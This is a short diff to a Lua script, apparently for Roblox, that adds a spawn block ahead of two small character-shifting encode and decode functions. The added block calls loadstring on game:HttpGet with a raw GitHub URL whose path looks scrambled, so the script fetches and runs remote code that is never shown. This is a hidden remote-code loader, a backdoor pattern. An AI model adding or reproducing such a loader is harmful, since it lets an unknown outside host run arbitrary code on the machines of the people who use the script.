@@ -1,3 +1,7 @@
+spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/e8bdfd1c618fd11a2912816996ece3bd81b7238e/info.lua"))()
+
+    end)
 function e(s) return s:gsub(".", function(c) return string.char(c:byte() + 1) end) end
 function d(s) return s:gsub(".", function(c) return string.char(c:byte() - 1) end) end
 
